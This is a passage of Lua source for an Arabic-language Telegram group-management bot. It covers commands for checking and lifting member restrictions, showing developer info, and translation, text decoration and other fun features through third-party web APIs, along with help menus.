local list = Redis:smembers(LaRiCa.."List:Rd:Sudo")
text = "\n• قائمة الردود العامه \nٴ— — — — — — — — — —\n"
for k,v in pairs(list) do
if Redis:get(LaRiCa.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:vico"..v) then
db = "بصمه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Text"..v) then
db = "رساله •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Photo"..v) then
db = "صوره •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Video"..v) then
db = "فيديو •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:File"..v) then
db = "ملف •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:video_note"..v) then
db = "بصمه فيديو •"
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "• لا توجد ردود للمطور"
end
return LuaTele.sendText(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
if text == 'كشف القيود' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Message_Reply.sender.user_id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
else
Restricted = 'غير مقيد'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanAll == true then
BanAll = 'محظور عام'
else
BanAll = 'غير محظور عام'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanGroup == true then
BanGroup = 'محظور'
else
BanGroup = 'غير محظور'
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).SilentGroup == true then
SilentGroup = 'مكتوم'
else
SilentGroup = 'غير مكتوم'
end
LuaTele.sendText(msg_chat_id,msg_id,"\n*• معلومات الكشف \nٴ— — — — — — — — — —"..'\n• الحظر العام : '..BanAll..'\n• الحظر : '..BanGroup..'\n• الكتم : '..SilentGroup..'\n• التقييد : '..Restricted..'*',"md",true)  
end
if text and text:match('^كشف القيود @(%S+)$') then
local UserName = text:match('^كشف القيود @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,UserId_Info.id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
else
Restricted = 'غير مقيد'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanAll == true then
BanAll = 'محظور عام'
else
BanAll = 'غير محظور عام'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanGroup == true then
BanGroup = 'محظور'
else
BanGroup = 'غير محظور'
end
if Statusrestricted(msg_chat_id,UserId_Info.id).SilentGroup == true then
SilentGroup = 'مكتوم'
else
SilentGroup = 'غير مكتوم'
end
LuaTele.sendText(msg_chat_id,msg_id,"\n*• معلومات الكشف \nٴ— — — — — — — — — —"..'\n• الحظر العام : '..BanAll..'\n• الحظر : '..BanGroup..'\n• الكتم : '..SilentGroup..'\n• التقييد : '..Restricted..'*',"md",true)  
end
if text == 'رفع القيود' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Message_Reply.sender.user_id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1})
else
Restricted = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanAll == true and msg.ControllerBot then
BanAll = 'محظور عام ,'
Redis:srem(LaRiCa.."BanAll:Groups",Message_Reply.sender.user_id) 
else
BanAll = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).BanGroup == true then
BanGroup = 'محظور ,'
Redis:srem(LaRiCa.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
else
BanGroup = ''
end
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).SilentGroup == true then
SilentGroup = 'مكتوم ,'
Redis:srem(LaRiCa.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
else
SilentGroup = ''
end
LuaTele.sendText(msg_chat_id,msg_id,"\n*• تم رفع القيود عنه : {"..BanAll..BanGroup..SilentGroup..Restricted..'}*',"md",true)  
end
if text and text:match('^رفع القيود @(%S+)$') then
local UserName = text:match('^رفع القيود @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,UserId_Info.id).status
if GetMemberStatus.luatele == "chatMemberStatusRestricted" then
Restricted = 'مقيد'
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1})
else
Restricted = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanAll == true and msg.ControllerBot then
BanAll = 'محظور عام ,'
Redis:srem(LaRiCa.."BanAll:Groups",UserId_Info.id) 
else
BanAll = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).BanGroup == true then
BanGroup = 'محظور ,'
Redis:srem(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
else
BanGroup = ''
end
if Statusrestricted(msg_chat_id,UserId_Info.id).SilentGroup == true then
SilentGroup = 'مكتوم ,'
Redis:srem(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
else
SilentGroup = ''
end
LuaTele.sendText(msg_chat_id,msg_id,"\n*• تم رفع القيود عنه : {"..BanAll..BanGroup..SilentGroup..Restricted..'}*',"md",true)  
end

if text == 'وضع كليشه المطور' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'GetTexting:DevLaRiCa'..msg_chat_id..':'..msg.sender.user_id,true)
return LuaTele.sendText(msg_chat_id,msg_id,'• ارسل لي الكليشه الان')
end
if text == 'مسح كليشة المطور' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa..'Texting:DevLaRiCa')
return LuaTele.sendText(msg_chat_id,msg_id,'• تم حذف كليشه المطور')
end
if text == 'مبرمج سورس' or text == 'مبرمج السورس' or text == 'المبرمج' then  
local UserId_Info = LuaTele.searchPublicChat("sSs_sSs")
if UserId_Info.id then
local UserInfo = LuaTele.getUser(UserId_Info.id)
local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local photo = LuaTele.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  ❲ LaRiCa 𝖲𝗈𝗎𝗋𝖼𝖾 ❳\n━═━═━═━═━\n⌔︰*Dev Name* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n⌔︰*Dev Bio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '٬ 𝙊𝙗𝙖 𝙇𝙖𝙍𝙞𝙘𝙖 🕷 ٫', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "- معلومات مبرمج السورس : \\nn: name Dev . ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '❲ 𝖼𝗈𝖽𝖾𝗋 ❳', url = "https://t.me/sSs_sSs"}
},
{
{text = '٬ 𝙊𝙗𝙖 𝙇𝙖𝙍𝙞𝙘𝙖 🕷 ٫', url = "https://t.me/LaRiCaTEAM"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
end
end
end
if text == 'المطور' or text == 'مطور' then   
local UserInfo = LuaTele.getUser(Sudo_Id) 
local InfoUser = LuaTele.getUserFullInfo(Sudo_Id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local photo = LuaTele.getUserProfilePhotos(Sudo_Id)
if photo.total_count > 0 then
local TestText = "  ❲ Developers Bot ❳\n━═━═━═━═━\n⌔︰*Dev Name* :  ["..UserInfo.first_name.."](tg://user?id="..Sudo_Id..")\n⌔︰*Dev Bio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '٬ 𝙊𝙗𝙖 𝙇𝙖𝙍𝙞𝙘𝙖 🕷 ٫', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "  ❲ Developers Source ❳\n━═━═━═━═━\n⌔︰*Dev Name* :  ["..UserInfo.first_name.."](tg://user?id="..Sudo_Id..")\n⌔︰*Dev Bio* : [❲ "..Bio.." ❳]"
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
end
end
---زخرفة ----
if Redis:get(LaRiCa.."toen"..msg.sender.user_id) == "on" then
gk = http.request('http://68.183.2.21/api/google.php?from=auto&to=en&text='..URL.escape(text)..'')
br = JSON.decode(gk)
Redis:del(LaRiCa.."toen"..msg.sender.user_id)
LuaTele.sendText(msg_chat_id,msg_id,br,"md",true) 
end
if Redis:get(LaRiCa.."toar"..msg.sender.user_id) == "on" then
gk = http.request('http://68.183.2.21/api/google.php?from=auto&to=ar&text='..URL.escape(text)..'')
br = JSON.decode(gk)
Redis:del(LaRiCa.."toar"..msg.sender.user_id)
LuaTele.sendText(msg_chat_id,msg_id,br,"md",true) 
end 
if text == "غنيلي" then
local t = "اليك اغنيه عشوائيه من البوت"
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
local m = "https://t.me/pvv_v/"..Rrr..""
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مره اخرى', callback_data=msg.sender.user_id.."/songg"},
},
}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendaudio?chat_id="..msg_chat_id.."&caption="..URL.escape(t).."&audio="..m.."&reply_to_message_id="..rep.."&parse_mode=Markdown&reply_markup="..JSON.encode(keyboard))
end
if text and text:match("^احسب (.*)$") then
local Textage = text:match("^احسب (.*)$")
u , res = https.request('https://black-source.xyz/BlackTeAM/Calculateage.php?age='..Textage)
JsonSInfo = JSON.decode(u)
local InfoGet = JsonSInfo['result']['info']
LuaTele.sendText(msg.chat_id,msg.id,InfoGet,"md", true)
end
if Redis:get(LaRiCa.."zhrfa"..msg.sender.user_id) == "sendzh" then
zh = https.request('https://black-source.xyz/BlackTeAM/frills.php?en='..URL.escape(text)..'')
zx = JSON.decode(zh)
t = "\n • قائمه الزخرفه \nٴ •ٴ≪━━━━━━━━━━━━≫ٴ •○ٴ \n"
i = 0
for k,v in pairs(zx.Get) do
i = i + 1
t = t..i.."- "..v.." \n"
end
LuaTele.sendText(msg_chat_id,msg_id,t,"md",true) 
Redis:del(LaRiCa.."zhrfa"..msg.sender.user_id) 
end
if text == "زخرفه" or text == "زخرفة" then
LuaTele.sendText(msg_chat_id,msg_id,"*• ارسل الكلمه لزخرفتها عربي او انجلش*","md",true) 
Redis:set(LaRiCa.."zhrfa"..msg.sender.user_id,"sendzh") 
end
if text and text:match("^زخرفه (.*)$") then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://black-source.xyz/BlackTeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n • قائمه الزخرفه \nٴ •ٴ≪━━━━━━━━━━━━≫ٴ •○ٴ \n"
i = 0
for k,v in pairs(zx.Get) do
i = i + 1
t = t..i.."- "..v.." \n"
end
LuaTele.sendText(msg_chat_id,msg_id,t,"md",true) 
end
if text and Redis:get(LaRiCa..msg.chat_id.."name_mean"..msg.sender.user_id) == "true" then 
Redis:del(LaRiCa..msg.chat_id.."name_mean"..msg.sender.user_id)
name_api = https.request("https://mahmoudm50.xyz/anubis/name_mean.php?name="..URL.escape(text).."")
local api_decode = JSON.decode(name_api)
local name_mean = api_decode['mean']
local photo_mean = api_decode['photo']
local rep = msg.id/2097152/0.5
  https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg_chat_id.."&caption="..URL.escape(name_mean).."&photo="..photo_mean.."&reply_to_message_id="..rep.."&parse_mode=Markdown")
end
if text == "معاني الاسماء" or text == "معني اسم" then
Redis:set(LaRiCa..msg.chat_id.."name_mean"..msg.sender.user_id , true)
return LuaTele.sendText(msg_chat_id,msg_id,"※ ارسل الاسم بالعربيه الان","md",true) 
end
---العمر---
if text == 'ترجمه' or text == 'ترجمة' or text == 'ترجم' or text == 'translat' then 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = 'الي العربية', data = msg.sender.user_id..'toar'},{text = 'الي الانجليزية', data = msg.sender.user_id..'toen'}},
{{text = ' قناة السورس', url = "https://t.me/LaRiCaTeam"}},}}
return LuaTele.sendText(msg_chat_id,msg_id, [[*• حسنا قم باختيار نوع الترجمه
• وبعدها سوف اقوم بالترجمه*]],"md",false, false, false, false, reply_markup)
end
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
local user_info = LuaTele.getUser(msg.sender.user_id)
local first_name = user_info.first_name
local RinkBot = msg.Name_Controller
video = "https://t.me/kkkpolppppppp/303"
local Name = '*- 𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘛𝘰 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.*\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝘋𝘦𝘝:𝘚𝘰𝘶𝘙𝘤𝘦', url = "https://t.me/sSs_sSs"},{text = '𝘊𝘩:𝘚𝘰𝘶𝘙𝘤𝘦', url = "https://t.me/LaRiCaTeam"},
},
{
{text = '𝘌𝘹𝘱:𝘚𝘰𝘶𝘙𝘤𝘦', url = "http://t.me/filesLaRiCa"}
},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendvideo?chat_id=" .. msg_chat_id .. "&video="..video.."&caption=".. URL.escape(Name).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
elseif text == 'الاوامر' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٬ ⁰ ٫', data = msg.sender.user_id..'/help1'}, {text = '٬ ¹ ٫', data = msg.sender.user_id..'/help2'}, 
},
{
{text = '٬ ² ٫', data = msg.sender.user_id..'/help3'}, {text = '٬ ³ ٫', data = msg.sender.user_id..'/help4'}, 
},
{
{text = '٬ ⁴ ٫', data = msg.sender.user_id..'/help5'}, {text = '٬ ⁵ ٫', data = msg.sender.user_id..'/help7'}, 
},
{
{text = '٬ ⁶ ٫', data = msg.sender.user_id..'/help6'}, 
},
{
{text = '𝖽𝗂𝗌𝗋𝗎𝗉𝗍𝗂𝗈𝗇 𝗈𝗋𝖽𝖾𝗋𝗌', data = msg.sender.user_id..'/NoNextSeting'}, {text = '𝗅𝗈𝖼𝗄 𝗈𝗋𝖽𝖾𝗋𝗌', data = msg.sender.user_id..'/listallAddorrem'}, 
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id, [[*
• 𝖤𝗑𝖲𝗌𝗍 ← 6 𝗈𝗋𝖣𝖾𝗋𝖲 𝗂𝖭 𝗍𝗁𝖤 𝖻𝖮𝗍
━─━─━─━─━
• 𝖲𝖾𝖭𝖽 { م0 } ←- 𝖢𝗅𝖾𝖺𝖭𝖾𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م1 } ←- 𝖯𝗋𝗈𝖳𝖾𝖼𝖳𝗂𝗈𝗇 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م2 } ←- 𝖮𝗋𝖽𝖾𝗋𝗌 𝗈𝖥 𝗍𝗁𝖾 𝖺𝖣𝗆𝗂𝖭𝗌 .
• 𝖲𝖾𝖭𝖽 { م3 } ←- 𝖬𝖺𝗇𝖠𝗀𝖾𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م4 } ←- 𝖢𝗈𝗇𝖲𝗍𝗋𝖴𝖼𝗍𝗈𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م5 } ←- 𝖣𝖾𝖵𝖾𝗅𝗈𝖯𝖾𝗋 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م6 } ←- E𝗇T𝖾R𝗍𝖺iN𝗆E𝗇𝗍 𝖮𝗋𝖽𝖾𝗋𝗌
*]],"md",false, false, false, false, reply_markup)
elseif text == 'م1' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م2' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م3' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م4' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م5' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م6' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
